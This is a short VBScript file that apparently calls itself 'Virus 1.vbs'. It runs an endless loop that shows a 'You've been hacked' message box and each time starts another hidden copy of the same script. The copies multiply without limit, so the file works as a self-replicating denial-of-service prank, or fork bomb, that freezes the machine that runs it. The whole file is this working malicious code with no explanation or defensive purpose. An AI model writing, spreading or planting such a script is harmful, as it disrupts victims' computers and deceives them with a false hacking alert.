do
msgbox "You've been hacked"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "Virus 1.vbs" & Chr(34), 0
Set WshShell = Nothing 
loop